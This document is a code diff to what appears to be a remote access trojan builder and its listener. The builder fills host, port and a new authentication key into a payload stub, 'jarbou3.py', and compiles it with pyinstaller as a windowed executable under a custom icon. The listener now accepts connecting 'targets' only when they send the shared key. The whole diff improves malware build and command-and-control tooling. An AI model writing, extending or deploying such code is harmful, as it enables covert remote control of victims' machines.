@@ -10,6 +10,11 @@ if f == "{}" or "":
     serverport = input('entre serverport:')
     with open('serverport.txt', 'w') as port:
         port.write(serverport)
+keys = open('key.txt', 'r').read()
+if keys == "{}" or "":
+    key = input('entre serverkey:')
+    with open('key.txt', 'w') as keyser:
+        keyser.write(key)
 
 
 def replace_string(filename, old_string, new_string):
@@ -24,6 +29,7 @@ def replace_string(filename, old_string, new_string):
 
 
 def build():
+    global key
     try:
         import socket
         import json
@@ -70,6 +76,8 @@ def build():
             os.system('powershell -c cd stub; cp jarbou3.py ..')
             replace_string('jarbou3.py', '$lhost', lhost)
             replace_string('jarbou3.py', '$lport', lport)
+            key = open('key.txt', 'r').read()
+            replace_string('jarbou3.py', '$key', key)
 
             print('[+]Compiling')
             os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "jarbou3.py"')
@@ -84,6 +92,7 @@ def build():
             ask = input('is  those your host and port(y/n):')
             if ask == 'y':
                 replace_string('jarbou3-pastebin.py','$pastebin',URL)
+                replace_string('jarbou3.py', '$key', key)
                 icon = ''
                 while isfile(icon) == False:
                     icon = input('entre your icon path:')
@@ -234,10 +243,15 @@ def accept_connections():
         sock.settimeout(1)
         try:
             target, ip = sock.accept()
-            targets.append(target)
-            ips.append(ip)
-            print((str(ip) + ' has connected!'))
-            clients += 1
+            key = open('key.txt', 'r').read()
+
+            if  target.recv(1024).decode() == key:
+                targets.append(target)
+                ips.append(ip)
+                print((str(ip) + ' has connected!'))
+                clients += 1
+            else:
+                pass
 
 
         except:
